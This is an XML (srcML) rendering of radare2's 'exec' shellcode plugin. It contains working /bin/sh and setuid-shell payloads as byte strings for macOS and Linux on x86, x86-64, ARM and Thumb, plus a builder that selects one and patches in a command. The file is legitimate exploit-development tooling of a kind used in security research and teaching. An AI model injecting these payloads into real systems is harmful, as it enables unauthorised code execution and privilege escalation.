<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<unit xmlns="http://www.srcML.org/srcML/src" xmlns:cpp="http://www.srcML.org/srcML/cpp" revision="1.0.0" language="C" filename="D:\Pesquisa\Projects\radare2-analysis\_cppstats\radare2\libr\egg\p\egg_exec.c"><cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;r_egg.h&gt;</cpp:file></cpp:include>

<cpp:if>#<cpp:directive>if</cpp:directive> <expr><literal type="number">0</literal></expr></cpp:if>

linux setresuid(0,0)+execv(/bin/sh)

31c031db31c999b0a4cd806a0b5851682f2f7368682f62696e89e35189e25389e1cd80

SETRESUID: (11 bytes)

"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"

BINSH: (24 bytes) (x86-32/64):

"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

<cpp:endif>#<cpp:directive>endif</cpp:directive></cpp:endif>

<decl_stmt><decl><type><specifier>static</specifier> <name>ut8</name></type> <name><name>x86_osx_suid_binsh</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"</literal>

<literal type="string">"\x31\xff\x4c\x89\xc0\x0f\x05"</literal>

<literal type="string">"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"</literal>

<literal type="string">"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"</literal>

<literal type="string">"\x2f\x62\x69\x6e\x2f\x73\x68"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>ut8</name></type> <name><name>x86_osx_binsh</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"</literal>

<literal type="string">"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"</literal>

<literal type="string">"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"</literal>

<literal type="string">"\x2f\x62\x69\x6e\x2f\x73\x68"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>ut8</name></type> <name><name>x86_linux_binsh</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x31\xc0\x50\x68"</literal>

<literal type="string">"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"</literal> 

<literal type="string">"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"</literal></expr></init></decl>;</decl_stmt>

<cpp:if>#<cpp:directive>if</cpp:directive> <expr><literal type="number">0</literal></expr></cpp:if>

static ut8 x86_64_linux_binsh[] =

"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53"

"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b"

"\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

<cpp:endif>#<cpp:directive>endif</cpp:directive></cpp:endif>

<decl_stmt><decl><type><specifier>static</specifier> <name>ut8</name></type> <name><name>x86_64_linux_binsh</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>ut8</name></type> <name><name>arm_linux_binsh</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x02\x20\x42\xe0\x1c\x30\x8f\xe2\x04\x30\x8d\xe5"</literal>

<literal type="string">"\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"</literal>

<literal type="string">"\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef"</literal>

<literal type="string">"\x2f\x62\x69\x6e\x2f\x73\x68"</literal></expr></init></decl>;</decl_stmt> 

<decl_stmt><decl><type><specifier>static</specifier> <name>ut8</name></type> <name><name>thumb_linux_binsh</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"</literal>

<literal type="string">"\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"</literal></expr></init></decl>;</decl_stmt> 

<function><type><specifier>static</specifier> <name>RBuffer</name> <modifier>*</modifier></type><name>build</name> <parameter_list>(<parameter><decl><type><name>REgg</name> <modifier>*</modifier></type><name>egg</name></decl></parameter>)</parameter_list> <block>{<block_content>

<decl_stmt><decl><type><name>RBuffer</name> <modifier>*</modifier></type><name>buf</name> <init>= <expr><call><name>r_buf_new</name> <argument_list>()</argument_list></call></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>const</specifier> <name>ut8</name> <modifier>*</modifier></type><name>sc</name> <init>= <expr><name>NULL</name></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>int</name></type> <name>cd</name> <init>= <expr><literal type="number">0</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>char</name> <modifier>*</modifier></type><name>shell</name> <init>= <expr><call><name>r_egg_option_get</name> <argument_list>(<argument><expr><name>egg</name></expr></argument>, <argument><expr><literal type="string">"cmd"</literal></expr></argument>)</argument_list></call></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>char</name> <modifier>*</modifier></type><name>suid</name> <init>= <expr><call><name>r_egg_option_get</name> <argument_list>(<argument><expr><name>egg</name></expr></argument>, <argument><expr><literal type="string">"suid"</literal></expr></argument>)</argument_list></call></expr></init></decl>;</decl_stmt>

<if_stmt><if>if <condition>(<expr><name>suid</name> <operator>&amp;&amp;</operator> <operator>*</operator><name>suid</name><operator>==</operator><literal type="char">'f'</literal></expr>)</condition> <block>{<block_content> 

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>suid</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<expr_stmt><expr><name>suid</name> <operator>=</operator> <name>NULL</name></expr>;</expr_stmt>

</block_content>}</block></if></if_stmt>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>os</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_EGG_OS_OSX</name></expr>:</case>

<case>case <expr><name>R_EGG_OS_DARWIN</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>arch</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_SYS_ARCH_X86</name></expr>:</case>

<if_stmt><if>if <condition>(<expr><name>suid</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_osx_suid_binsh</name></expr>;</expr_stmt>

<expr_stmt><expr><name>cd</name> <operator>=</operator> <literal type="number">7</literal><operator>+</operator><literal type="number">36</literal></expr>;</expr_stmt>

</block_content>}</block></if> <else>else <block>{<block_content>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_osx_binsh</name></expr>;</expr_stmt>

<expr_stmt><expr><name>cd</name> <operator>=</operator> <literal type="number">36</literal></expr>;</expr_stmt>

</block_content>}</block></else></if_stmt>

<case>case <expr><name>R_SYS_ARCH_ARM</name></expr>:</case>

<break>break;</break>

</block_content>}</block></switch>

<break>break;</break>

<case>case <expr><name>R_EGG_OS_LINUX</name></expr>:</case>

<if_stmt><if>if <condition>(<expr><name>suid</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"no suid for this platform\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></if></if_stmt>

<expr_stmt><expr><name>suid</name> <operator>=</operator> <literal type="number">0</literal></expr>;</expr_stmt>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>arch</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_SYS_ARCH_X86</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>bits</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><literal type="number">32</literal></expr>:</case>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_linux_binsh</name></expr>;</expr_stmt>

<break>break;</break>

<case>case <expr><literal type="number">64</literal></expr>:</case>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_64_linux_binsh</name></expr>;</expr_stmt>

<break>break;</break>

<default>default:</default>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Unsupported arch %d bits\n"</literal></expr></argument>, <argument><expr><name><name>egg</name><operator>-&gt;</operator><name>bits</name></name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></switch>

<break>break;</break>

<case>case <expr><name>R_SYS_ARCH_ARM</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>bits</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><literal type="number">16</literal></expr>:</case>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>thumb_linux_binsh</name></expr>;</expr_stmt>

<break>break;</break>

<case>case <expr><literal type="number">32</literal></expr>:</case>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>arm_linux_binsh</name></expr>;</expr_stmt>

<break>break;</break>

<default>default:</default>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Unsupported arch %d bits\n"</literal></expr></argument>, <argument><expr><name><name>egg</name><operator>-&gt;</operator><name>bits</name></name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></switch>

<break>break;</break>

</block_content>}</block></switch>

<break>break;</break>

<default>default:</default>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Unsupported os %x\n"</literal></expr></argument>, <argument><expr><name><name>egg</name><operator>-&gt;</operator><name>os</name></name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<break>break;</break>

</block_content>}</block></switch>

<if_stmt><if>if <condition>(<expr><name>sc</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><call><name>r_buf_set_bytes</name> <argument_list>(<argument><expr><name>buf</name></expr></argument>, <argument><expr><name>sc</name></expr></argument>, <argument><expr><call><name>strlen</name> <argument_list>(<argument><expr><operator>(</operator><specifier>const</specifier> <name>char</name> <operator>*</operator><operator>)</operator><name>sc</name></expr></argument>)</argument_list></call></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<if_stmt><if>if <condition>(<expr><name>shell</name> <operator>&amp;&amp;</operator> <operator>*</operator><name>shell</name></expr>)</condition> <block>{<block_content>

<if_stmt><if>if <condition>(<expr><name>cd</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><call><name>r_buf_write_at</name> <argument_list>(<argument><expr><name>buf</name></expr></argument>, <argument><expr><name>cd</name></expr></argument>, <argument><expr><operator>(</operator><specifier>const</specifier> <name>ut8</name> <operator>*</operator><operator>)</operator><name>shell</name></expr></argument>, <argument><expr><call><name>strlen</name> <argument_list>(<argument><expr><name>shell</name></expr></argument>)</argument_list></call> <operator>+</operator> <literal type="number">1</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></if> <else>else <block>{<block_content>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Cannot set shell\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></else></if_stmt>

</block_content>}</block></if></if_stmt>

</block_content>}</block></if></if_stmt>

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>suid</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>shell</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<return>return <expr><name>buf</name></expr>;</return>

</block_content>}</block></function>

<decl_stmt><decl><type><name>REggPlugin</name></type> <name>r_egg_plugin_exec</name> <init>= <expr><block>{

<expr><operator>.</operator><name>name</name> <operator>=</operator> <literal type="string">"exec"</literal></expr>,

<expr><operator>.</operator><name>type</name> <operator>=</operator> <name>R_EGG_PLUGIN_SHELLCODE</name></expr>,

<expr><operator>.</operator><name>desc</name> <operator>=</operator> <literal type="string">"execute cmd=/bin/sh suid=false"</literal></expr>,

<expr><operator>.</operator><name>build</name> <operator>=</operator> <operator>(</operator><name>void</name> <operator>*</operator><operator>)</operator><name>build</name></expr>

}</block></expr></init></decl>;</decl_stmt>

<cpp:if>#<cpp:directive>if</cpp:directive> <expr><operator>!</operator><call><name>defined</name><argument_list>(<argument><expr><name>R2_PLUGIN_INCORE</name></expr></argument>)</argument_list></call></expr></cpp:if>
<decl_stmt><decl><type><name>R_API</name> <name>RLibStruct</name></type> <name>radare_plugin</name> <init>= <expr><block>{

<expr><operator>.</operator><name>type</name> <operator>=</operator> <name>R_LIB_TYPE_EGG</name></expr>,

<expr><operator>.</operator><name>data</name> <operator>=</operator> <operator>&amp;</operator><name>r_egg_plugin_exec</name></expr>,

<expr><operator>.</operator><name>version</name> <operator>=</operator> <name>R2_VERSION</name></expr>

}</block></expr></init></decl>;</decl_stmt>

<cpp:endif>#<cpp:directive>endif</cpp:directive></cpp:endif>

</unit>
